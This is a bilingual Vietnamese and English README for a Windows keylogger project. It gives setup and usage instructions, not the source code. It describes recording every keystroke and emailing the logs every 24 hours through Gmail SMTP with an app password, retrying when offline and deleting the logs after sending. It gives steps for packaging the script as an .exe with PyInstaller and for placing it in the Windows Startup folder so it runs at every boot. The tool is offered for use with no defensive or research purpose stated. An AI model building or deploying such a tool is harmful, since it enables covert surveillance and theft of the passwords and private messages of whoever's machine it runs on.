# Keylogger System - Hướng Dẫn Sử Dụng

## Mô Tả Dự Án

Hệ thống keylogger tự động ghi lại các phím được nhấn và gửi dữ liệu qua email mỗi 24 giờ. Hệ thống hỗ trợ xử lý offline, tự động retry khi mất mạng, và có thể chạy tự động khi Windows khởi động.

## Cấu Trúc Dự Án

```
keylogger/
├── system-24h.py    # Script keylogger chính
├── build.py         # Script build file .exe
├── run.bat          # Script copy file .exe vào Startup
└── README.md        # File hướng dẫn này
```

## Yêu Cầu Hệ Thống

- **Hệ điều hành**: Windows 10/11
- **Python**: Phiên bản 3.7 trở lên
- **Thư viện Python cần thiết**:
  - `pyinstaller` (tự động cài khi chạy build.py)
  - `requests` (tự động cài khi chạy build.py)
  - `keyboard` (tự động cài khi chạy build.py)

## Cấu Hình

### 1. Cấu hình Email trong `system-24h.py`

Mở file `system-24h.py` và chỉnh sửa phần `EMAIL_CONFIG`:

```python
EMAIL_CONFIG = {
    'email': 'your-email@gmail.com',           # Email gửi
    'password': 'your-app-password',            # App Password (không dùng mật khẩu thường)
    'recipient_email': 'your-email@gmail.com',   # Email nhận (có thể giống email gửi)
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587
}
```

**Lưu ý quan trọng về Email:**

- Email nhận và email gửi có thể là cùng một email (để gửi cho chính mình)

**Lưu ý quan trọng về Gmail:**

- Email này phải đã bật xác thực 2 bước (2-Step Verification)
- Bạn cần tạo **App Password** thay vì dùng mật khẩu thường
- Vào Google Account → Security → 2-Step Verification → App passwords
- Tạo App Password mới và sử dụng mật khẩu đó

### 2. Các thông số có thể tùy chỉnh

```python
MAX_FILE_AGE = 86400      # Thời gian file tồn tại trước khi gửi (giây) - 24 giờ
CHECK_INTERVAL = 3600      # Kiểm tra mỗi 1 giờ khi có internet
RETRY_INTERVAL = 300       # Thử lại sau 5 phút khi mất mạng
LOG_PREFIX = "data"        # Tiền tố tên file log
LOG_SUFFIX = ".txt"        # Hậu tố tên file log
```

## Hướng Dẫn Sử Dụng

### Bước 1: Cấu hình Email

1. Mở file `system-24h.py`
2. Chỉnh sửa `EMAIL_CONFIG` với thông tin email của bạn
3. Lưu file

### Bước 2: Build File EXE

1. Mở Command Prompt hoặc PowerShell trong thư mục project
2. Chạy lệnh:
   ```bash
   python build.py
   ```
3. Script sẽ tự động:
   - Cài đặt các thư viện cần thiết (nếu chưa có)
   - Quét tất cả file `.py` trong thư mục (trừ `build.py`)
   - Tạo file `.exe` cho từng file Python
   - Lưu tất cả file `.exe` vào thư mục `build-exe`

**Kết quả:**
- Thư mục `build-exe/` sẽ chứa các file `.exe` đã build
- File `system-24h.exe` sẽ được tạo trong thư mục này

### Bước 3: Thiết Lập Tự Chạy Khi Khởi Động

1. Sau khi build xong, chạy file `run.bat`:
   ```bash
   run.bat
   ```
2. Script sẽ tự động:
   - Copy tất cả file `.exe` từ thư mục `build-exe` vào thư mục Startup của Windows
   - Khi Windows khởi động, các file `.exe` sẽ tự động chạy

**Vị trí thư mục Startup:**
```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```

### Bước 4: Kiểm Tra Hoạt Động

- File log sẽ được tạo với tên `data1.txt`, `data2.txt`, ...
- Mỗi 24 giờ, file log sẽ được gửi qua email và tự động xóa
- Nếu mất mạng, hệ thống sẽ lưu file và thử gửi lại khi có internet

---

# Keylogger System - User Guide

## Project Description

The keylogger system automatically records keystrokes and sends data via email every 24 hours. The system supports offline processing, automatic retry when network is lost, and can run automatically when Windows starts.

## Project Structure

```
keylogger/
├── system-24h.py    # Main keylogger script
├── build.py         # Script to build .exe file
├── run.bat          # Script to copy .exe to Startup
└── README.md        # This guide file
```

## System Requirements

- **Operating System**: Windows 10/11
- **Python**: Version 3.7 or higher
- **Required Python Libraries**:
  - `pyinstaller` (automatically installed when running build.py)
  - `requests` (automatically installed when running build.py)
  - `keyboard` (automatically installed when running build.py)

## Configuration

### 1. Email Configuration in `system-24h.py`

Open the `system-24h.py` file and edit the `EMAIL_CONFIG` section:

```python
EMAIL_CONFIG = {
    'email': 'your-email@gmail.com',           # Sender email
    'password': 'your-app-password',            # App Password (do not use regular password)
    'recipient_email': 'your-email@gmail.com',   # Recipient email (can be the same as sender email)
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587
}
```

**Important Notes about Email:**

- Recipient email and sender email can be the same (to send to yourself)

**Important Notes about Gmail:**

- This email must have 2-Step Verification enabled
- You need to create an **App Password** instead of using your regular password
- Go to Google Account → Security → 2-Step Verification → App passwords
- Create a new App Password and use that password

### 2. Customizable Parameters

```python
MAX_FILE_AGE = 86400      # File age before sending (seconds) - 24 hours
CHECK_INTERVAL = 3600      # Check every 1 hour when internet is available
RETRY_INTERVAL = 300       # Retry after 5 minutes when network is lost
LOG_PREFIX = "data"        # Log file name prefix
LOG_SUFFIX = ".txt"        # Log file name suffix
```

## Usage Guide

### Step 1: Configure Email

1. Open the `system-24h.py` file
2. Edit `EMAIL_CONFIG` with your email information
3. Save the file

### Step 2: Build EXE File

1. Open Command Prompt or PowerShell in the project directory
2. Run the command:
   ```bash
   python build.py
   ```
3. The script will automatically:
   - Install required libraries (if not already installed)
   - Scan all `.py` files in the directory (except `build.py`)
   - Create `.exe` file for each Python file
   - Save all `.exe` files to the `build-exe` directory

**Results:**
- The `build-exe/` directory will contain the built `.exe` files
- The `system-24h.exe` file will be created in this directory

### Step 3: Set Up Auto-Start on Boot

1. After building, run the `run.bat` file:
   ```bash
   run.bat
   ```
2. The script will automatically:
   - Copy all `.exe` files from the `build-exe` directory to Windows Startup folder
   - When Windows starts, the `.exe` files will run automatically

**Startup Folder Location:**
```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```

### Step 4: Check Operation

- Log files will be created with names `data1.txt`, `data2.txt`, ...
- Every 24 hours, the log file will be sent via email and automatically deleted
- If network is lost, the system will save the file and retry sending when internet is available
